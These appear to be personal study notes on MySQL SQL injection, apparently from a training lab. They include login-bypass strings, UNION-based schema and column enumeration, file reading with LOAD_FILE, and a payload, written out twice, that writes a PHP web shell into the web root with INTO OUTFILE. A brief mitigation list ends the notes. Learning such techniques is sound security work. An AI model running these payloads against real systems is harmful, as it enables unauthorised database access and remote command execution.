Mysql client >> do not provide flag for password as it is stored in history in cleartext

Check privs with *SHOW GRANTS*

## Types of injection
 - Blind
 - In band
 -  out of band

#### Blind - Boolean based/ Time Based
#### In Band - Union Based / Error Based
#### Out of Band - No output but effect other location


## Subverting Query Logic

Test if form is vulnerable to SQLinjection, does it filter `(', ;, :, #)`

Can add `' OR 1 = 1` to login fields too
use `' OR 1 =1 ` in the username field if we know the admin login
use `' OR 1 = 1 ` in password field to select first user from the database (Which is usually admin)

Passwords are usually hashed so is tricky to SQL inject with them.


###### Comment shit out with ;-- - to kill off a line (can also use %23(#))

### Union Combines Results

Union combines results with other fields using the union as CrossRef 

before using union injections we need to find amount of rows in tables.

incrimenting order by untill we get an error 

example 
```SQL
 ' ORDER BY 1 ---                                '
-- ADD ANOTHER NUMBER UNTIL ERROR
 ' ORDER BY 2 --                                  ' 
 ERROR
 One COLUMN
```

Not all columns always visible.
using columns as junk data allows us to see which columns are being printed

```sql
cn' UNION select 1,@@version,3,4-- -
```
will display version

cn' UNION SELECT 1, user(), 3 4; -- -


### MYSQL Fingerprinting

SELECT @@version

Information SCHEMA
Most databases have a schema. this shows metadata, databases and tables present on server.

```shell-session
SELECT * FROM INFORMATION_SCHEMA.SCHEMATA;
```

INFORMATION_SCHEMA.TABLES > TABLE_NAME(names) & TABLE_SCHEMA()

> Find printed numbers
> Select TABLE_SCHEMA and TABLE_NAME in those

we can then enum column names with COLUMN_NAME

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='products'-- -
```


we can then use {TABLE_SCHEMA}.{TABLE_NAME} for our search functions

#### Reading Files

Relies on LOAD_FILE() function of sql

SQL can see user with SELECT USER()
can check user privs with
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

Possible that php code can display in the browser

#### Writing Files
secure_file_priv allows writing to files.  can check with

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

if Secure file priv is empty then anyone can read/write

to write files use INTO OUTFILE '/file/path'
> It is possible to send strings directly to the outfile
```sql
SELECT "HELLO" from users INTO OUTFILE '/etc/passwd'
```

the files that are created are then owned by the sql server.
if the sql server is running root and makes a shell it will be root

__Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.__

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
^STOLEN SHELL
### MITIGATION
 
- Input Sanitization
- Input Validation
- User privileges  - Server reader should not be able to read/write files. and can only read certain tables.
- Web Application Firewall(waf) which detects any malicious http requests and rejects 



2345 SELECTED

```sql
	cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -
```

cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA, 4, 5 from INFORMATION_SCHEMA.COLUMNS-- -
